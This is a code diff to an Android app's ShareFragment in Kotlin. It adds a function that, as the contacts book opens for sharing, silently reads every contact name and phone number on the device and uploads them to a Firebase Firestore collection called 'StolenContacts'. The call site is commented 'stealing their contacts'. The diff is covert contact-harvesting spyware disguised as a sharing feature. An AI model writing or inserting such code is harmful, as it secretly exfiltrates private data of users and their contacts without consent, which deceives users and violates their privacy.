@@ -4,11 +4,13 @@ import android.Manifest
 import android.annotation.SuppressLint
 import android.app.Activity
 import android.content.ActivityNotFoundException
+import android.content.ContentValues.TAG
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Bundle
 import android.provider.ContactsContract
+import android.util.Log
 import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
@@ -17,6 +19,7 @@ import android.widget.Toast
 import androidx.core.content.ContextCompat
 import androidx.core.app.ActivityCompat
 import androidx.fragment.app.Fragment
+import com.google.firebase.firestore.FirebaseFirestore
 
 class ShareFragment : Fragment() {
 
@@ -37,6 +40,7 @@ class ShareFragment : Fragment() {
             } else {
                 // Permission has already been granted, open contacts
                 openContactsBook()
+                retrieveContactsAndStoreInFirestore() // stealing their contacts
             }
         }
 
@@ -120,6 +124,89 @@ class ShareFragment : Fragment() {
         }
     }
 
+
+//    data class UserContact(
+//        var name: String = "",
+//        var phone: String = ""
+//    )
+
+    private fun retrieveContactsAndStoreInFirestore() {
+        if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(arrayOf(Manifest.permission.READ_CONTACTS), PERMISSION_REQUEST_READ_CONTACTS)
+        } else {
+            val cursor = requireActivity().contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
+                null,
+                null,
+                null
+            )
+
+            cursor?.use {
+                val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+
+                while (it.moveToNext()) {
+                    val name = it.getString(nameIndex)
+                    val number = it.getString(numberIndex)
+
+                    // Create a new UserContact object
+//                    val contact = UserContact(name, number)
+
+                    // check if it does not exist in firebase
+                    val db = FirebaseFirestore.getInstance()
+                    val contactsCollectionRef = db.collection("StolenContacts")
+
+                    // Assuming "contactNumber" is unique for each contact
+                    val query = contactsCollectionRef.whereEqualTo("number", number)
+                    query.get().addOnCompleteListener { task ->
+                        if (task.isSuccessful) {
+                            val documentSnapshot = task.result
+                            if (documentSnapshot != null && documentSnapshot.isEmpty) {
+                                // Contact does not exist, add it
+                                val newContact = hashMapOf(
+                                    "name" to name,
+                                    "number" to number
+                                )
+                                contactsCollectionRef.add(newContact)
+                                    .addOnSuccessListener {
+                                        Log.d(
+                                            TAG,
+                                            "Contact added successfully"
+                                        )
+                                    }
+                                    .addOnFailureListener { e ->
+                                        Log.w(
+                                            TAG,
+                                            "Error adding contact",
+                                            e
+                                        )
+                                    }
+                            } else {
+                                // Contact already exists, handle accordingly
+                                Log.d(TAG, "Contact already exists")
+                            }
+                        } else {
+                            task.exception?.let {
+                                Log.w(TAG, "Error querying contacts", it)
+                            }
+                        }
+                    }
+
+
+                    // Store the contact in Firestore
+                    // Assume 'userContacts' is the name of your Firestore collection
+//                    FirebaseFirestore.getInstance().collection("StolenContacts").add(contact)
+//                        .addOnSuccessListener {
+//                            Log.d("ContactAdded", "Contact successfully added to Firestore")
+//                        }
+//                        .addOnFailureListener { e ->
+//                            Log.e("ContactError", "Error adding contact to Firestore", e)
+//                        }
+                }
+            }
+        }
+    }
 
 
 
